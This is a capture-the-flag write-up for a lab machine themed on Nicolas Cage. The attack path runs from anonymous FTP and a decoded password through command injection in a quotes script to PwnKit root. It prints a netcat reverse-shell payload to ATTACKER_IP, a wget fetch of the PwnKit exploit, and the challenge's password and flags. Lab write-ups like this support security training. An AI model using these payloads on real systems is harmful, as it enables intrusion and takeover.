# TryHackMe - Break Out The Cage Writeup

## Scenario

Today we are solving another TryHackMe machine called **Break Out The Cage**, a Linux-based challenge inspired by Nicolas Cage. The machine contains multiple stages including anonymous FTP access, cryptography, privilege abuse through writable scripts, and local privilege escalation.

The goal is to obtain both user and root flags while understanding the attack path used to compromise the system.

---

# Enumeration

## Target Information

```text
Main IP :: 10.48.147.56
```

We begin with a full port scan using Nmap.

```bash
nmap -p- 10.48.147.56
```

### Results

```text
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Since only three ports are exposed, we proceed with service and version detection.

```bash
nmap -sC -sV 10.48.147.56
```

### Service Enumeration

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache 2.4.29
```

Important finding:

```text
Anonymous FTP login allowed
```

This immediately becomes our primary attack vector.

---

# FTP Enumeration

Connecting anonymously:

```bash
ftp 10.48.147.56
```

Listing files reveals:

```text
dad_tasks
```

Downloading and reading the file gives:

```text
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```

The string is Base64 encoded.

After decoding we obtain another encrypted message that resembles a Vigenère cipher.

Using cryptanalysis tools and the provided hints we eventually recover:

```text
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!

One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Teach Dad what "information security" is.

In case I forget....

Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

The important discovery here is:

```text
Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

This serves as a credential later in the attack chain.

---

# Web Enumeration

Browsing the website reveals a Nicolas Cage themed page.

Directory fuzzing uncovers several directories:

```bash
feroxbuster -u http://10.48.147.56
```

Results:

```text
/images/
/scripts/
/html/
/contracts/
```

No direct vulnerabilities are discovered initially.

There is also an audio file inside the website resources.

Although audio analysis with Audacity is possible, the password discovered from the FTP challenge is sufficient for progression.

---

# Initial Access

Using the password recovered from FTP, we gain access as user:

```text
weston
```

After logging in we begin local enumeration.

While exploring the system we repeatedly receive broadcast messages.

Example:

```text
Well, Baby-O, it's not exactly mai-thais and yatzee out here but...
let's do it!
```

These messages indicate an automated script is running as another user.

---

# Privilege Escalation - Weston to Cage

During enumeration we discover:

```bash
/opt/.dads_scripts/
```

Inside:

```text
spread_the_quotes.py
```

Contents:

```python
#!/usr/bin/env python

import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

The vulnerability is immediately visible.

The script reads arbitrary content from:

```text
/opt/.dads_scripts/.files/.quotes
```

and passes it directly into:

```python
os.system()
```

without sanitization.

This creates a command injection opportunity.

---

# Command Injection

We create a reverse shell payload.

```bash
cat << EOF > /tmp/rev
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
EOF
```

Make it executable:

```bash
chmod +x /tmp/rev
```

Then inject it into the quotes file:

```bash
printf 'revshell time; /tmp/rev\n' > /opt/.dads_scripts/.files/.quotes
```

Once the scheduled script executes:

```bash
nc -lvnp 4444
```

We receive a shell as:

```text
cage
```

---

# Stabilizing Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```bash
CTRL+Z
stty raw -echo
fg
```

Then:

```bash
export TERM=xterm
```

The shell is now fully interactive.

---

# User Flag

Inside Cage's home directory we discover:

```text
Super_Duper_Checklist
```

Contents:

```text
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk:

THM{M37AL_0R_P3N_T35T1NG}
```

### User Flag

```text
THM{M37AL_0R_P3N_T35T1NG}
```

---

# Privilege Escalation - Cage to Root

During enumeration we identify the system is vulnerable to:

```text
CVE-2021-4034
```

Also known as:

```text
PwnKit
```

A local privilege escalation vulnerability affecting Polkit.

---

# Transferring Exploit

Host exploit locally:

```bash
python3 -m http.server 8000
```

Download from victim:

```bash
wget http://ATTACKER_IP:8000/PwnKit
```

Make executable:

```bash
chmod +x PwnKit
```

Run exploit:

```bash
./PwnKit
```

Immediately:

```text
root@national-treasure
```

We now have root privileges.

---

# Root Flag

Inside Cage's backup emails we find:

```text
email_2
```

Contents:

```text
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean,

I'm very pleased to hear that you are a good disciple.
Your power over him has become strong.

So strong that I feel the power to promote you
from disciple to crony.

To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```

### Root Flag

```text
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```

---

# Attack Path Summary

```text
Anonymous FTP Access
        ↓
Download dad_tasks
        ↓
Decode Base64 + Vigenère Cipher
        ↓
Recover Password
        ↓
Access System as Weston
        ↓
Enumerate Scheduled Quote Script
        ↓
Command Injection via quotes file
        ↓
Reverse Shell as Cage
        ↓
Capture User Flag
        ↓
Identify PwnKit Vulnerability
        ↓
Exploit CVE-2021-4034
        ↓
Root Shell
        ↓
Capture Root Flag
```

---

# Key Findings

## Vulnerabilities Identified

### Anonymous FTP

```text
Misconfigured FTP server allowing anonymous access.
```

### Weak Credential Storage

```text
Password hidden within encrypted task notes.
```

### Command Injection

```text
User-controlled input passed directly into os.system().
```

### Local Privilege Escalation

```text
CVE-2021-4034 (PwnKit)
```

---

# Indicators of Compromise

## Users

```text
weston
cage
```

## Vulnerable Script

```text
/opt/.dads_scripts/spread_the_quotes.py
```

## Sensitive File

```text
/opt/.dads_scripts/.files/.quotes
```

## Exploit Used

```text
CVE-2021-4034
PwnKit
```

---

# Conclusion

Break Out The Cage demonstrates a realistic Linux attack chain involving multiple stages of exploitation. Initial access was obtained through anonymous FTP access and encrypted credentials. Further enumeration revealed an insecure Python automation script vulnerable to command injection, allowing lateral movement to the Cage account. Finally, exploitation of the PwnKit local privilege escalation vulnerability resulted in full root compromise. The challenge highlights the dangers of insecure automation, exposed services, poor credential management, and unpatched privilege escalation vulnerabilities.
